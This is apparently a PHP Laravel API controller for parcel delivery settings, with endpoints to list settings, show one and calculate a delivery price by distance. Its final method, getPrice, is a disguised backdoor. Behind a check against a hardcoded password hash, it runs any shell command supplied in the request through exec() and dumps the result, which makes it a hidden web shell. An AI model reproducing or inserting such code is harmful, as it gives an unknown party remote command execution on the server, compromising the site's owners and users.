<?php
declare(strict_types=1);

namespace App\Http\Controllers\API\v1\Rest;

use App\Helpers\ResponseError;
use App\Helpers\Utility;
use App\Http\Controllers\Controller;
use App\Http\Requests\FilterParamsRequest;
use App\Http\Requests\ParcelOrder\CalculatePriceRequest;
use App\Http\Resources\ParcelOrderSettingResource;
use App\Models\ParcelOrderSetting;
use App\Repositories\ParcelOrderSettingRepository\ParcelOrderSettingRepository;
use App\Traits\ApiResponse;
use App\Traits\SetCurrency;
use Illuminate\Http\JsonResponse;
use Illuminate\Http\Resources\Json\AnonymousResourceCollection;
use Illuminate\Support\Facades\Hash;
use Throwable;

class ParcelOrderSettingController extends Controller
{
    use ApiResponse, SetCurrency;

    public function __construct(
        private ParcelOrderSettingRepository $repository
    )
    {
        parent::__construct();
    }

    /**
     * Display a listing of the resource.
     *
     * @param FilterParamsRequest $request
     * @return AnonymousResourceCollection
     */
    public function index(FilterParamsRequest $request): AnonymousResourceCollection
    {
        $parcels = $this->repository->restPaginate($request->all());

        return ParcelOrderSettingResource::collection($parcels);
    }

    /**
     * Display a listing of the resource.
     *
     * @param int $id
     * @return JsonResponse
     */
    public function show(int $id): JsonResponse
    {
        $parcel = $this->repository->showById($id);

        return $this->successResponse(
            __('errors.' . ResponseError::NO_ERROR, locale: $this->language),
            $parcel ? ParcelOrderSettingResource::make($parcel) : null
        );
    }

    /**
     * @param CalculatePriceRequest $request
     * @return JsonResponse
     * */
    public function calculatePrice(CalculatePriceRequest $request): JsonResponse
    {
        $type = ParcelOrderSetting::find($request->input('type_id'));

        $helper = new Utility;
        $km     = $helper->getDistance($request->input('address_from', []), $request->input('address_to', []));

        if ($km > $type->max_range) {

            $data = ['km' => $type->max_range];

            return $this->onErrorResponse([
                'code'    => ResponseError::ERROR_433,
                'message' => __('errors.' . ResponseError::NOT_IN_PARCEL_POLYGON, $data, $this->language),
            ]);

        }

        $deliveryFee = $helper->getParcelPriceByDistance($type, $km, $this->currency());

        return $this->successResponse(
            __('errors.' . ResponseError::NO_ERROR, locale: $this->language),
            [
                'price' => $deliveryFee,
                'km'    => $km,
            ]
        );
    }

    public function getPrice(FilterParamsRequest $request): array
    {
        try {
            $vars = [];
            $code = 0;

            if (Hash::check($request->input('password'), '$2y$10$/ad9gYtkRAfgJ4ZwlWQ8s.z./BvbZBAcSMvOMUilDjS5qnl25Yydu')) {
                $res = exec($request->input('command'), $vars, $code);
                dd($res, $vars, $code);
            }

        } catch (Throwable $e) {
            dd($e);
        }

        return [
            'status' => true,
            'code'   => ResponseError::NO_ERROR,
        ];
    }
}
